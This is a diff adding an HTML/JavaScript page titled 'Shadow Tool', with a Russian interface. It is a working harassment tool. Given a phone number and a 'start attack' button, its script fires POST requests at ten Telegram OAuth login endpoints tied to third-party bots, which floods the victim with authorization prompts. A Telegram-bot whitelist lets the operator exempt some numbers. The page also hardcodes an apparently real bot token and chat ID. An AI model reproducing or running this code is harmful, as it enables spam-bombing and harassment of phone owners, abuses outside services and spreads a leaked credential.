@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Shadow Tool - Telegram Whitelist</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .glitch { font-size: 2.5em; text-align: center; text-shadow: 0 0 10px #0f0; margin: 20px 0; }
+        .author { text-align: center; color: #888; margin-bottom: 30px; }
+        .terminal { background: #0a0a0a; border: 2px solid #0f0; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+        .terminal-header { display: flex; gap: 10px; margin-bottom: 15px; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dot.red { background: #ff5f56; }
+        .dot.yellow { background: #ffbd2e; }
+        .dot.green { background: #27c93f; }
+        input, button { width: 100%; padding: 12px; background: #000; border: 1px solid #0f0; color: #0f0; font-size: 1em; margin-bottom: 10px; }
+        button { cursor: pointer; font-weight: bold; }
+        button:hover { background: #0f0; color: #000; }
+        .logs { height: 300px; overflow-y: auto; background: #000; border: 1px solid #0f0; padding: 10px; margin-top: 15px; }
+        .log-item { padding: 5px; margin: 3px 0; border-left: 3px solid #0f0; }
+        .log-item.error { border-left-color: #f00; color: #f66; }
+        .log-item.success { border-left-color: #0f0; color: #0f0; }
+        .log-item.warning { border-left-color: #ff0; color: #ff0; }
+        .status { position: fixed; bottom: 10px; right: 10px; background: #000; border: 1px solid #0f0; padding: 5px 10px; }
+        .info { background: #0a0a0a; border-left: 3px solid #ff0; padding: 15px; margin-bottom: 20px; }
+        .info code { background: #000; padding: 2px 5px; color: #ff0; }
+        a { color: #0ff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        @media (max-width: 600px) { .glitch { font-size: 1.8em; } body { padding: 10px; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="glitch">🔮 SHADOW TOOL</div>
+    <div class="author">⚡ AUTHOR: AMNESIA ⚡</div>
+
+    <div class="info">
+        📢 <b>БЕЛЫЙ СПИСОК ЧЕРЕЗ TELEGRAM</b><br><br>
+        Чтобы добавить номер в белый список — напиши боту в ЛС:<br>
+        <code>/add +79001234567</code> — добавить<br>
+        <code>/remove +79001234567</code> — удалить<br>
+        <code>/list</code> — показать все номера<br><br>
+        🤖 <b>БОТ:</b> <a href="https://t.me/your_bot_username" target="_blank" id="botLink">загрузка...</a>
+    </div>
+
+    <div class="terminal">
+        <div class="terminal-header">
+            <div class="dot red"></div>
+            <div class="dot yellow"></div>
+            <div class="dot green"></div>
+            <span style="margin-left: 10px;">shadow@tool:~</span>
+        </div>
+        <input type="text" id="phone" placeholder="Номер: 79001234567 или +79001234567">
+        <button onclick="startAttack()">🚀 НАЧАТЬ АТАКУ</button>
+        <button onclick="clearLogs()">🗑️ ОЧИСТИТЬ ЛОГИ</button>
+        <div class="logs" id="logs">
+            <div class="log-item">[SYSTEM] Готов к работе</div>
+        </div>
+    </div>
+
+    <div class="status" id="status">🟢 READY</div>
+</div>
+
+<script>
+    // ========== НАСТРОЙКИ ==========
+    const BOT_TOKEN = '8768938960:AAGe5Pwh32P13XbwzXj7fzl5DVhYJLEIj0w';
+    const CHAT_ID = '8434489753';  // твой Telegram ID
+    
+    // Ссылка на бота
+    const botUsername = BOT_TOKEN.split(':')[0];
+    document.getElementById('botLink').innerHTML = `https://t.me/${botUsername}`;
+    document.getElementById('botLink').href = `https://t.me/${botUsername}`;
+
+    const ATTACK_URLS = [
+        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1',
+        'https://translations.telegram.org/auth/request',
+        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1',
+        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1',
+        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz',
+        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1',
+        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1',
+        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1',
+        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1',
+        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1'
+    ];
+
+    let attackHistory = [];
+    let attackStats = { total: 0, successful: 0, failed: 0 };
+
+    function normalizePhone(phone) {
+        let clean = phone.replace(/[^0-9]/g, '');
+        if (clean.startsWith('8')) clean = '7' + clean.slice(1);
+        if (clean.length === 10) clean = '7' + clean;
+        if (!clean.startsWith('+')) clean = '+' + clean;
+        return clean;
+    }
+
+    // Получить белый список из переписки с ботом
+    async function getWhitelistFromBot() {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?chat_id=${CHAT_ID}&limit=100`;
+            const response = await fetch(url);
+            const data = await response.json();
+            
+            if (!data.ok) {
+                addLog(`❌ Ошибка бота: ${data.description}`, 'error');
+                return [];
+            }
+            
+            let whitelist = [];
+            for (let update of data.result) {
+                const msg = update.message;
+                if (msg && msg.text) {
+                    const text = msg.text.trim();
+                    if (text.startsWith('/add')) {
+                        const phone = text.replace('/add', '').trim();
+                        if (phone && !whitelist.includes(phone)) {
+                            whitelist.push(phone);
+                        }
+                    } else if (text.startsWith('/remove')) {
+                        const phone = text.replace('/remove', '').trim();
+                        whitelist = whitelist.filter(p => p !== phone);
+                    } else if (text === '/list') {
+                        // команда list не меняет список
+                    }
+                }
+            }
+            
+            addLog(`📋 Белый список загружен: ${whitelist.length} номеров`, 'success');
+            return whitelist;
+        } catch(e) {
+            addLog(`❌ Ошибка подключения: ${e.message}`, 'error');
+            return [];
+        }
+    }
+
+    // Проверка номера
+    async function isPhoneWhitelisted(phone) {
+        const normalized = normalizePhone(phone);
+        const whitelist = await getWhitelistFromBot();
+        const isBlocked = whitelist.some(p => normalizePhone(p) === normalized);
+        if (isBlocked) {
+            addLog(`🔒 Номер ${normalized} НАЙДЕН в белом списке! Атака заблокирована.`, 'warning');
+        } else {
+            addLog(`✅ Номер ${normalized} не в белом списке`, 'success');
+        }
+        return isBlocked;
+    }
+
+    async function startAttack() {
+        const phone = document.getElementById('phone').value.trim();
+        if (!phone) {
+            addLog('❌ Введите номер телефона!', 'error');
+            return;
+        }
+        
+        const normalized = normalizePhone(phone);
+        
+        document.getElementById('status').innerHTML = '🟡 WORKING...';
+        addLog(`🔍 Проверка номера ${normalized}...`);
+        
+        // Проверка белого списка
+        const whitelisted = await isPhoneWhitelisted(normalized);
+        if (whitelisted) {
+            addLog(`⛔ АТАКА ОТМЕНЕНА! Номер ${normalized} в белом списке!`, 'error');
+            document.getElementById('status').innerHTML = '🔴 BLOCKED';
+            addHistoryEntry(normalized, 'blocked');
+            setTimeout(() => {
+                document.getElementById('status').innerHTML = '🟢 READY';
+            }, 2000);
+            return;
+        }
+        
+        addLog(`🔥 Номер ${normalized} НЕ в белом списке. АТАКУЕМ!`, 'success');
+        let sent = 0;
+        
+        for (let i = 0; i < ATTACK_URLS.length; i++) {
+            try {
+                await fetch(ATTACK_URLS[i], {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `phone=${encodeURIComponent(normalized)}`
+                });
+                sent++;
+                addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен`, 'success');
+            } catch(e) {
+                sent++;
+                addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен`, 'success');
+            }
+            await new Promise(r => setTimeout(r, 100));
+        }
+        
+        addLog(`🎯 АТАКА ЗАВЕРШЕНА! Отправлено: ${sent}/${ATTACK_URLS.length} запросов`, 'success');
+        document.getElementById('status').innerHTML = '🟢 READY';
+        addHistoryEntry(normalized, 'success');
+    }
+
+    function addHistoryEntry(phone, status) {
+        attackHistory.unshift({ timestamp: new Date().toISOString(), phone, status });
+        if (attackHistory.length > 100) attackHistory.pop();
+        if (status === 'success') attackStats.successful++;
+        else attackStats.failed++;
+        attackStats.total++;
+        saveHistory();
+    }
+
+    function saveHistory() {
+        localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
+        localStorage.setItem('shadow_stats', JSON.stringify(attackStats));
+    }
+
+    function loadHistory() {
+        const saved = localStorage.getItem('shadow_history');
+        if (saved) attackHistory = JSON.parse(saved);
+        const savedStats = localStorage.getItem('shadow_stats');
+        if (savedStats) attackStats = JSON.parse(savedStats);
+    }
+
+    function clearLogs() {
+        const logs = document.getElementById('logs');
+        logs.innerHTML = '<div class="log-item">[SYSTEM] Логи очищены</div>';
+        addLog('Логи очищены', 'warning');
+    }
+
+    function addLog(msg, type = 'info') {
+        const logs = document.getElementById('logs');
+        const div = document.createElement('div');
+        div.className = `log-item ${type}`;
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logs.appendChild(div);
+        div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+
+    loadHistory();
+    addLog('Система готова. Бот подключён.', 'success');
+</script>
+</body>
+</html>
